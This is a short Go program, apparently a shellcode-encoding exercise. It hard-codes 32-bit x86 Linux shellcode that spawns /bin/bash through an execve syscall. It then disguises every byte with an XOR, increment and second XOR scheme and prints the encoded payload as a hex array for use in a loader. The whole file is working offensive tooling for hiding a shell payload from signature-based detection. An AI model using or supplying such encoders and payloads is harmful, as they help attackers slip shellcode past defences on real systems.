package main

import "fmt"

func main() {

	// Hard-coded original shellcode
	shellcode := []byte{0x31, 0xc0, 0x50, 0x68, 0x62, 0x61, 0x73, 0x68, 0x68, 0x62, 0x69, 0x6e, 0x2f, 0x68, 0x2f, 0x2f, 0x2f, 0x2f, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80}

	var key1 byte = 0x05 // 1st XOR value
	var key2 byte = 0x11 // 2nd XOR value

	encodedShellcode := make([]byte, len(shellcode))

	for i := range shellcode {

		xor1 := shellcode[i] ^ key1 // 1st XOR by 0x05
		inc := xor1 + 1             // Increment by 1
		xor2 := inc ^ key2          // 2nd XOR by 0x11
		encodedShellcode[i] = xor2
	}

	fmt.Printf("[INFO] Lengh: %v\n", len(encodedShellcode))
	fmt.Printf("[INFO] Encoded Shellcode: ")

	for c := 0; c < len(encodedShellcode); c++ {

		if encodedShellcode[c] < 16 { // Here to check if the Hex value is a single digit.

			fmt.Printf("0x0%x,", encodedShellcode[c])

		} else {

			fmt.Printf("0x%x,", encodedShellcode[c])
		}
	}
}
